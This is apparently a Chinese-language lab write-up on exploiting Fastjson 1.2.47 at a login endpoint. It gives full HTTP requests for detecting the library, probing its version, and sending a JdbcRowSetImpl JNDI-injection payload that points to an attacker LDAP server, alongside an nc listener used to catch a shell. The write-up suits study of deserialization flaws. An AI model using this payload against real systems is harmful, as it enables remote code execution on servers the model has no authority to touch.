### 判断是否使用fastjson

> 不闭合花括号,看看是否触发报错

```http
POST /login HTTP/1.1
Host: 192.168.111.20
Content-Length: 39
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/json; charset=UTF-8
Origin: http://192.168.111.20
Referer: http://192.168.111.20/tologin
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

{"username":"admin","password":"111111"
```

![image-20251118142934149](./assets/image-20251118142934149.png)

******

### 探测版本信息

> {
>   "@type": "java.lang.AutoCloseable"

```http
POST /login HTTP/1.1
Host: 192.168.111.20
Content-Length: 39
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/json; charset=UTF-8
Origin: http://192.168.111.20
Referer: http://192.168.111.20/tologin
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

{
  "@type": "java.lang.AutoCloseable"
```

![image-20251118143156801](./assets/image-20251118143156801.png)

版本信息为`1.2.47`,存在漏洞

******

### 漏洞利用

> 由于机器不出网,所以到不了dnslog,只能弹本地

- 本地`nc`监听,启动`ladp`服务,构造如下请求

![image-20251118151156499](./assets/image-20251118151156499.png)

```http
POST /login HTTP/1.1
Host: 192.168.111.20
Content-Length: 264
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/json; charset=UTF-8
Origin: http://192.168.111.20
Referer: http://192.168.111.20/tologin
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://192.168.111.25:1389/890iga",
        "autoCommit":true
    }
}
```

![image-20251118151044609](./assets/image-20251118151044609.png)

```
识别后端是否使用Fastjson：通过在登录处抓包，修改JSON参数（如删除末尾的}或添加"），观察是否出现标准的Fastjson错误提示。
检测Fastjson漏洞存在性：利用DNSlog进行测试，构造包含特定@type和val参数的JSON payload，发送请求后查看DNSlog是否收到请求，以判断是否存在漏洞。靶场环境不出网，故无法使用dnslog测试，但回显报错一致，学习方法即可。
探测Fastjson精确版本：构造包含{"@type": "java.lang.AutoCloseable"}的JSON payload，根据返回的报错信息确定版本为1.2.47。
利用1.2.47版本漏洞：该版本存在mappings缓存机制漏洞，可利用JdbcRowSetImpl进行JNDI注入。
```

